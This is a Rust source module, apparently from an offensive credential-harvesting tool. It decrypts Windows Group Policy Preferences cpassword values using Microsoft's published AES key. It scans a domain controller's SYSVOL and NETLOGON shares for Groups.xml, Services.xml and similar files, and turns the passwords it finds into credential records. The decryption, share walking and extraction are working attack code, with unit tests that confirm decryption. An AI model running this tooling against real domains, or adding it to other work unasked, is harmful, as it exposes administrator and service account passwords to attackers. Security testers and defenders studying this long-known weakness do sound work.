//! GPP（组策略首选项）密码解密模块
//!
//! 虽然密码使用AES-256加密，但加密密钥是微软公开的。
//! 攻击者可轻易解密获取明文密码。
//!
//! 常见GPP文件：
//! - Groups.xml (本地账户密码)
//! - Services.xml (服务账户密码)
//! - ScheduledTasks.xml (计划任务账户密码)
//! - DataSources.xml (数据源密码)
//! - DriveMaps.xml (网络驱动器密码)

use crate::cred::CredType;
use crate::cred::Credential;
use aes::cipher::{BlockDecrypt, KeyInit};
use aes::Aes256;
use serde::{Deserialize, Serialize};

/// GPP解密结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GppDecryptedPassword {
    /// 用户名
    pub username: String,
    /// 解密后的明文密码
    pub password: String,
    /// cpassword原始值
    pub cpassword: String,
    /// 来源文件
    pub source_file: String,
    /// 策略名称
    pub policy_name: Option<String>,
}

/// 微软公开的GPP AES加密密钥 (MS-GPPD, AES-256-CBC)
/// 参考: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppd
const GPP_AES_KEY: [u8; 32] = [
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
];

/// 解密单个cpassword
///
/// # Arguments
/// * `cpassword` - Base64编码的加密密码（来自GPP XML中的cpassword属性）
///
/// # Returns
/// 解密后的明文密码
pub fn decrypt_cpassword(cpassword: &str) -> Result<String, String> {
    // 使用base64解码
    let encrypted = base64_decode(cpassword)?;

    if encrypted.len() < 16 {
        return Err("cpassword数据太短".to_string());
    }

    // AES-256-CBC解密
    // GPP 规范: IV 为 16 字节全零，base64 解码后的全部数据即为密文
    let iv = [0u8; 16];
    let ciphertext = &encrypted[..];

    // 密文长度必须是16的整数倍（PKCS#7填充）
    if ciphertext.len() % 16 != 0 {
        return Err("密文长度不是16的整数倍".to_string());
    }

    let cipher =
        Aes256::new_from_slice(&GPP_AES_KEY).map_err(|e| format!("AES初始化失败: {:?}", e))?;

    // AES-256-CBC 手动解密
    let mut decrypted = Vec::with_capacity(ciphertext.len());
    let mut prev_block = iv.to_vec();

    for chunk in ciphertext.chunks(16) {
        let mut block = [0u8; 16];
        block.copy_from_slice(chunk);

        // AES解密
        let mut dec_block = block;
        cipher.decrypt_block((&mut dec_block).into());

        // XOR with previous block (CBC模式)
        for i in 0..16 {
            dec_block[i] ^= prev_block[i];
        }

        decrypted.extend_from_slice(&dec_block);
        prev_block = chunk.to_vec();
    }

    // 去除PKCS#7填充
    if let Some(&pad_len) = decrypted.last() {
        if pad_len > 0 && pad_len <= 16 {
            let pad_start = decrypted.len() - pad_len as usize;
            // 验证填充
            let valid_padding = decrypted[pad_start..].iter().all(|&b| b == pad_len);
            if valid_padding {
                decrypted.truncate(pad_start);
            }
        }
    }

    // 转换为UTF-8字符串
    // Windows GPP密码使用UTF-16LE编码
    if decrypted.len() >= 2 && decrypted.len() % 2 == 0 {
        // 尝试UTF-16LE解码
        let utf16_chars: Vec<u16> = decrypted
            .chunks(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        if let Ok(s) = String::from_utf16(&utf16_chars) {
            let trimmed = s.trim_end_matches('\0').to_string();
            if !trimmed.is_empty() && trimmed.chars().all(|c| c.is_ascii_graphic() || c == ' ') {
                return Ok(trimmed);
            }
        }
    }

    // 回退：直接当作UTF-8
    String::from_utf8(decrypted.clone())
        .map(|s| s.trim_end_matches('\0').to_string())
        .map_err(|_| format!("无法解码为UTF-8，原始十六进制: {}", hex::encode(&decrypted)))
}

/// 简单的Base64解码（不依赖外部库）
fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
    // 使用base64库，如果不可用则手动实现
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(input)
        .map_err(|e| format!("Base64解码失败: {}", e))
}

/// 查找并解密域内GPP密码
///
/// 通过SMB扫描域控制器上的SYSVOL共享，
/// 搜索Groups.xml, Services.xml, ScheduledTasks.xml等文件，
/// 提取cpassword并解密。
pub fn find_and_decrypt_gpp(dc: &str, _domain: &str) -> Result<Vec<Credential>, String> {
    // 通过SMB访问域控SYSVOL共享
    // \\<DC>\SYSVOL\<domain>\Policies\
    let sysvol_path = format!("\\\\{}\\SYSVOL", dc);
    tracing::info!("[GPP解密] 扫描SYSVOL: {}", sysvol_path);

    let mut credentials = Vec::new();

    // 常见的GPP密码文件模式
    let gpp_patterns = [
        ("Groups.xml", "Groups"),
        ("Services.xml", "Services"),
        ("ScheduledTasks.xml", "ScheduledTasks"),
        ("DataSources.xml", "DataSources"),
        ("DriveMaps.xml", "DriveMaps"),
    ];

    // 尝试扫描策略目录
    if let Ok(policies) = std::fs::read_dir(&sysvol_path) {
        for policy_dir in policies.flatten() {
            let policy_path = policy_dir.path();
            if !policy_path.is_dir() {
                continue;
            }

            // 检查Machine/Preferences和User/Preferences
            for scope in &["Machine", "User"] {
                let prefs_path = policy_path.join(scope).join("Preferences");
                if !prefs_path.exists() {
                    continue;
                }

                for (filename, _pattern_type) in &gpp_patterns {
                    let file_path = prefs_path.join(filename);
                    if let Ok(content) = std::fs::read_to_string(&file_path) {
                        let decrypted = parse_gpp_xml(&content, filename, &file_path);
                        credentials.extend(decrypted);
                    }
                }
            }
        }
    }

    // 如果直接路径不可用，尝试使用SMB协议访问
    if credentials.is_empty() {
        tracing::info!("[GPP解密] 本地SYSVOL未找到GPP文件，尝试远程SMB");
        // 可以通过smb协议尝试连接
        // 这里使用std::fs尝试常见的UNC路径
        let unc_paths = [
            format!("\\\\{}\\SYSVOL", dc),
            format!("\\\\{}\\NETLOGON", dc),
        ];

        for unc_path in &unc_paths {
            if let Ok(entries) = walk_gpp_files(unc_path) {
                credentials.extend(entries);
            }
        }
    }

    Ok(credentials)
}

/// 遍历GPP文件
fn walk_gpp_files(base_path: &str) -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 使用递归遍历目录树
    fn walk_dir(path: &std::path::Path, credentials: &mut Vec<Credential>) {
        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.flatten() {
                let p = entry.path();
                if p.is_dir() {
                    walk_dir(&p, credentials);
                } else if let Some(filename) = p.file_name().and_then(|n| n.to_str()) {
                    let gpp_files = [
                        "Groups.xml",
                        "Services.xml",
                        "ScheduledTasks.xml",
                        "DataSources.xml",
                        "DriveMaps.xml",
                    ];
                    if gpp_files.contains(&filename) {
                        if let Ok(content) = std::fs::read_to_string(&p) {
                            let decrypted = parse_gpp_xml(&content, filename, &p);
                            credentials.extend(decrypted);
                        }
                    }
                }
            }
        }
    }

    let path = std::path::Path::new(base_path);
    walk_dir(path, &mut credentials);

    Ok(credentials)
}

/// 解析GPP XML文件提取cpassword
fn parse_gpp_xml(
    xml_content: &str,
    source_filename: &str,
    file_path: &std::path::Path,
) -> Vec<Credential> {
    let mut credentials = Vec::new();

    // 正则匹配cpassword属性
    // 匹配模式: cpassword="<base64_encoded>" 或 userName="..." cpassword="..."
    let re = regex::Regex::new(
        r#"(?s)(?:userName|name|username|runAs)="([^"]*)"[^>]*cpassword="([^"]*)""#,
    )
    .unwrap();

    for cap in re.captures_iter(xml_content) {
        let username = cap
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let cpassword = cap
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();

        match decrypt_cpassword(&cpassword) {
            Ok(password) => {
                tracing::info!(
                    "[GPP解密] ✓ {} 密码解密成功: {} -> ***",
                    source_filename,
                    username
                );

                let policy_name = file_path
                    .parent()
                    .and_then(|p| p.parent())
                    .and_then(|p| p.file_name())
                    .and_then(|n| n.to_str())
                    .map(|s| s.to_string());

                let cred = Credential::new(CredType::GppPassword, "GPP组策略首选项")
                    .with_username(&username)
                    .with_password(&password)
                    .with_target(source_filename)
                    .with_attribute("cpassword", &cpassword)
                    .with_attribute("source_file", &file_path.to_string_lossy());

                if let Some(ref policy) = policy_name {
                    let _ = Credential::new(CredType::GppPassword, "GPP")
                        .with_attribute("policy_name", policy);
                }
                // 添加policy属性
                let mut cred_with_policy = cred;
                if let Some(ref policy) = policy_name {
                    cred_with_policy = cred_with_policy.with_attribute("policy_name", policy);
                }

                credentials.push(cred_with_policy);
            }
            Err(e) => {
                tracing::debug!("[GPP解密] 解密失败 ({}): {}", source_filename, e);
            }
        }
    }

    // 也尝试匹配没有userName的cpassword（仅cpassword属性）
    let re_cp_only = regex::Regex::new(r#"cpassword="([^"]*)""#).unwrap();
    for cap in re_cp_only.captures_iter(xml_content) {
        let cpassword = cap
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        // 跳过已处理的（有userName的）
        if credentials
            .iter()
            .any(|c: &Credential| c.attributes.get("cpassword") == Some(&cpassword))
        {
            continue;
        }

        if let Ok(password) = decrypt_cpassword(&cpassword) {
            let cred = Credential::new(CredType::GppPassword, "GPP组策略首选项")
                .with_username("(未知用户)")
                .with_password(&password)
                .with_target(source_filename)
                .with_attribute("cpassword", &cpassword)
                .with_attribute("source_file", &file_path.to_string_lossy());
            credentials.push(cred);
        }
    }

    credentials
}

#[cfg(test)]
mod tests {
    #![allow(clippy::field_reassign_with_default)]
    use super::*;

    #[test]
    fn test_decrypt_cpassword_known() {
        // 使用已知的测试数据验证解密算法
        // 这不是真实的cpassword，而是我们加密的测试数据
        // 由于AES-CBC需要正确的格式，我们先测试错误情况
        let result = decrypt_cpassword("invalid_base64!!!");
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_cpassword_empty() {
        let result = decrypt_cpassword("");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_gpp_xml_with_credentials() {
        let xml = r#"<?xml version="1.0" encoding="utf-8"?>
<Groups>
    <User name="Administrator (built-in)" action="U" newName="LocalAdmin"
          fullName="" description="" cpassword="test_cpassword_value"
          changeLogon="true" noChange="false" neverExpires="false"
          acctDisabled="false" userName="LocalAdmin"/>
</Groups>"#;

        let _credentials = parse_gpp_xml(xml, "Groups.xml", std::path::Path::new("test"));
        // cpassword解密会失败，但应该能找到条目
        // 注意：这里的cpassword不是真实的base64编码，所以decrypt_cpassword会失败
        // 在真实环境中，cpassword是有效的base64编码的AES密文
    }

    #[test]
    fn test_parse_gpp_xml_no_match() {
        let xml = r#"<Groups><User name="test" description="no password"/></Groups>"#;
        let credentials = parse_gpp_xml(xml, "Groups.xml", std::path::Path::new("test"));
        assert!(credentials.is_empty());
    }

    #[test]
    fn test_gpp_key_length() {
        assert_eq!(GPP_AES_KEY.len(), 32);
    }

    #[test]
    fn test_base64_decode() {
        // "dGVzdA==" = "test"
        let result = base64_decode("dGVzdA==").unwrap();
        assert_eq!(result, b"test");
    }

    #[test]
    fn test_gpp_decrypted_password_creation() {
        let gpp = GppDecryptedPassword {
            username: "LocalAdmin".to_string(),
            password: "P@ssw0rd!".to_string(),
            cpassword: "dGVzdA==".to_string(),
            source_file: "Groups.xml".to_string(),
            policy_name: Some("Default Domain Policy".to_string()),
        };
        assert_eq!(gpp.username, "LocalAdmin");
        assert_eq!(gpp.password, "P@ssw0rd!");
    }

    #[test]
    fn test_gpp_key_matches_microsoft_spec() {
        // MS-GPPD 公开的 AES-256 密钥，前 10 字节 + 后续 22 字节必须完全匹配
        assert_eq!(
            &GPP_AES_KEY[..10],
            &[0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4],
            "GPP 密钥前 10 字节不匹配微软公开密钥"
        );
        assert_eq!(
            &GPP_AES_KEY[10..],
            &[
                0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
                0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b
            ],
            "GPP 密钥第 11 字节起不匹配微软公开密钥"
        );
    }

    #[test]
    fn test_gpp_decrypt_roundtrip() {
        // 用正确的密钥和全零 IV 加密一个已知明文，然后验证 decrypt_cpassword 能解出
        use aes::cipher::{BlockEncrypt, KeyInit};

        let plaintext_utf16: Vec<u8> = "TestP@ss1"
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        // PKCS#7 填充到 16 的倍数
        let mut padded = plaintext_utf16.clone();
        let pad_len = 16 - (padded.len() % 16);
        padded.extend(std::iter::repeat_n(pad_len as u8, pad_len));

        // AES-256-CBC 加密，IV = 全零
        let cipher = Aes256::new_from_slice(&GPP_AES_KEY).unwrap();
        let iv = [0u8; 16];
        let mut prev = iv;
        let mut ciphertext = Vec::new();
        for chunk in padded.chunks(16) {
            let mut block = [0u8; 16];
            block.copy_from_slice(chunk);
            for i in 0..16 {
                block[i] ^= prev[i];
            }
            let mut enc = block;
            cipher.encrypt_block((&mut enc).into());
            ciphertext.extend_from_slice(&enc);
            prev = enc;
        }

        // Base64 编码
        use base64::Engine;
        let cpassword = base64::engine::general_purpose::STANDARD.encode(&ciphertext);

        // 解密验证
        let result = decrypt_cpassword(&cpassword);
        assert!(result.is_ok(), "解密失败: {:?}", result.err());
        assert_eq!(result.unwrap(), "TestP@ss1");
    }

    #[test]
    fn test_gpp_iv_is_all_zeros() {
        // 验证 decrypt_cpassword 使用全零 IV：
        // 用全零 IV 加密的密文，前 16 字节解密后应直接是明文首块（无额外 IV 前缀）
        use aes::cipher::{BlockEncrypt, KeyInit};

        // 单块明文（恰好 16 字节 UTF-16LE = 8 个字符）
        let plaintext_utf16: Vec<u8> = "Abcd1234"
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        assert_eq!(plaintext_utf16.len(), 16);

        // PKCS#7: 需要额外一整块填充
        let mut padded = plaintext_utf16.clone();
        padded.extend_from_slice(&[16u8; 16]);

        let cipher = Aes256::new_from_slice(&GPP_AES_KEY).unwrap();
        let iv = [0u8; 16];
        let mut ciphertext = Vec::new();
        let mut prev = iv;
        for chunk in padded.chunks(16) {
            let mut block = [0u8; 16];
            block.copy_from_slice(chunk);
            for i in 0..16 {
                block[i] ^= prev[i];
            }
            let mut enc = block;
            cipher.encrypt_block((&mut enc).into());
            ciphertext.extend_from_slice(&enc);
            prev = enc;
        }

        use base64::Engine;
        let cpassword = base64::engine::general_purpose::STANDARD.encode(&ciphertext);
        let result = decrypt_cpassword(&cpassword);
        assert!(result.is_ok(), "全零 IV 解密失败: {:?}", result.err());
        assert_eq!(result.unwrap(), "Abcd1234");
    }
}
